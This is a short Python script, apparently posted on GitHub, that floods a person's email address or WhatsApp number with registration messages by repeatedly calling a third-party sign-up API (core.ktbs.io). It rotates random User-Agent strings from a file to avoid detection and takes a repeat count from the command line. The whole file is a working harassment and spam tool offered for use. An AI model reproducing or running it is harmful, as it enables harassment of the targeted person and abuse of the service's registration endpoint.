
#author:Mr.Xantuy

try:
    import requests,random,os,argparse,time
except:
    quit('## python -m pip install requests')

class spam:
    def __init__(self):
        self.ua = open('ua.txt','r').read().split('\n')

    def set_data(self,u,t,c):
        self.type=t
        self.user=u
        self.coun=c

    def spaming(self):
        os.system('clear')
        print('## Author: [\033[96mMrXantuy\033[0m]')
        print(f'## type: {self.type}')
        print(f'## ok spamming: {self.user}')
        for _ in range(self.coun):
            ol = requests.post('https://core.ktbs.io/v2/user/registration/temp', 
                    json={'full_name':'Maoundiss','user_id':self.user,'user_id_type':self.type},
                    headers={'User-Agent':random.choice(self.ua)})
            if ol.status_code==200:
                print(f'\033[92m## spam success: {self.user}')
            else:
                print(f'\033[91m## pesang error: {ol.json()["errors"][0]["details"]["id"]}')
            time.sleep(1) #delay :'v

if __name__=='__main__':
    s=spam()
    a=argparse.ArgumentParser()
    a.add_argument('-u',help='email atau nomor whatsapp',type=str)
    a.add_argument('-c',help='jumlah spam sayang',type=int,default=1)
    g=a.parse_args()
    if '@' in str(g.u):
        t = 'email'
    elif str(g.u).isdigit():
        t = 'phone_number'
    else:
        quit(f'## usage: python {__file__} -h')
    s.set_data(u=g.u,t=t,c=g.c)
    s.spaming()
© 2020 GitHub, Inc.
